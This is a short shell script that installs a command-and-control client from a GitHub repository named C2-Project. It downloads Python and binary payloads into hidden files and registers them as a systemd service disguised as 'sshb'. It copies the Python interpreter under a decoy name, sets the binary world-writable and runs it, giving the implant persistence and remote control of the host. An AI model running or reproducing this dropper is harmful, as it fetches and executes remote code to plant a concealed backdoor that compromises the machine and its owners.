#Make directory in /usr/local/bin
mkdir /var/lib/sshb/
#Curl the client file into it
curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /var/lib/sshb/.sshb.py
curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /usr/local/bin/.client.py
#copy python
cp /usr/bin/python3 /usr/bin/python3.1
#Curl the service file into it
curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.service > /etc/systemd/system/sshb.service
#Enable and start the service
systemctl daemon-reload
systemctl enable sshb
systemctl start sshb
#Curl the binary file to sshb
curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client > /var/lib/sshb/sshb
chmod 777 /var/lib/sshb/sshb
/var/lib/sshb/sshb
#Tell the user you finished
echo Finished install!
systemctl status sshb